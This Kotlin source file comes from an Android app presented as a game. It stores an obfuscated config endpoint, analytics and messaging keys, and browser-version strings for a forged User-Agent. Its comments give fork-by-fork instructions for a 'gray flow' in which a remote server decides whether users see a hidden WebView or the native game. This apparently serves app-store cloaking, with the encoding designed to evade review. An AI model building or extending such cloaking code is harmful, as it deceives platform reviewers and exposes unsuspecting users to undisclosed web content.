package com.thundercrest.thundercrestgame.volt.cipher

/**
 * Encoded byte arrays that resolve, at runtime, into the endpoint,
 * SDK keys and User-Agent fragments used by the gray flow.
 *
 * Plaintext MUST NEVER appear as a string literal in this file — that
 * would defeat the whole point of [VoltCipher].
 *
 * ────────────────────────────────────────────────────────────────
 * HOW TO POPULATE
 * ────────────────────────────────────────────────────────────────
 * 1. Ask the manager for:
 *      • config endpoint URL
 *      • AppsFlyer Dev Key
 *      • Firebase project number (from google-services.json)
 *    See the gray-flow guide's "Config Request Contract".
 *
 * 2. Edit `tools/pack_secrets.py` — paste those raw strings into the
 *    plaintext table at the bottom of the file. Never commit that
 *    plaintext version.
 *
 * 3. IMPORTANT: also update [VoltCipher.SEED_PHRASE] +
 *    [VoltCipher.STREAM_LEN] to values UNIQUE to this fork. Then
 *    mirror those two constants at the top of `pack_secrets.py`.
 *
 * 4. Run `python tools/pack_secrets.py` from the project root. It
 *    prints updated `val ... = intArrayOf(...)` lines.
 *
 * 5. Paste them here, replacing the existing arrays.
 *
 * 6. Verify: launch the app once — [VoltSplashScreen] must reach
 *    the config reply successfully (either allow → WebView, or deny
 *    → native game). If you see the offline screen on a live
 *    network, the byte arrays are misaligned with the seed.
 */
internal object VoltPacked {

    // Full POST endpoint that decides web (gray) vs native (game).
    // Thunder Crest config endpoint.
    val CONFIG_ENDPOINT_BYTES = intArrayOf(
        6, 178, 20, 165, 5, 254, 115, 55, 244, 18, 173, 44,
        111, 209, 242, 45, 234, 38, 4, 187, 181, 46, 57, 41,
        162, 160, 0, 254, 56, 69, 56, 22, 201, 51, 156, 33,
    )

    // AppsFlyer Dev Key.
    val ATTRIBUTION_KEY_BYTES = intArrayOf(
        62, 129, 86, 155, 67, 181, 14, 123, 195, 30, 186,
        54, 114, 247, 221, 44, 190, 34, 53, 138, 179, 101,
    )

    // Firebase project number / sender id.
    val MESSAGING_PROJECT_BYTES = intArrayOf(
        91, 246, 80, 230, 66, 247, 108, 40, 177, 78, 239, 112,
    )

    // Chrome major/build/patch fragment for the forged User-Agent.
    // Bump on every fork.
    val CHROME_VERSION_BYTES = intArrayOf(
        95, 242, 89, 251, 70, 234, 107, 46, 184, 75, 246, 123, 51,
    )

    // WebKit version fragment.
    val WEBKIT_VERSION_BYTES = intArrayOf(
        91, 245, 87, 251, 69, 242,
    )

    fun configEndpoint(): String = VoltCipher.decode(CONFIG_ENDPOINT_BYTES)
    fun attributionKey(): String = VoltCipher.decode(ATTRIBUTION_KEY_BYTES)
    fun messagingProject(): String = VoltCipher.decode(MESSAGING_PROJECT_BYTES)
    fun chromeVersion(): String = VoltCipher.decode(CHROME_VERSION_BYTES)
    fun webkitVersion(): String = VoltCipher.decode(WEBKIT_VERSION_BYTES)
}
